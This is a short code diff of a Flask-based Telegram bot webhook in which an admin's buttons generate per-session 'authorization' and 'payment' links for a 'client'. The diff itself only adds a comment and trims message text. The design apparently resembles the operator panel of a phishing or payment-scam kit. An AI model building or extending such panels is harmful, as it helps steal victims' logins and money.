@@ -7,7 +7,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
-CORS(app)
+CORS(app)  # ← важно!
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
@@ -71,15 +71,13 @@ def webhook():
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_82554/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
-            edit_message_text(chat_id, message_id,
-                f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            edit_message_text(chat_id, message_id, f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
             link = f"{SITE_URL}/page_63860/?session={session_id}"
             send_callback_answer(callback_id, "✅ Ссылка на оплату")
-            edit_message_text(chat_id, message_id,
-                f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
+            edit_message_text(chat_id, message_id, f"💳 <b>Ссылка на оплату</b>\n\n{link}", None)
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
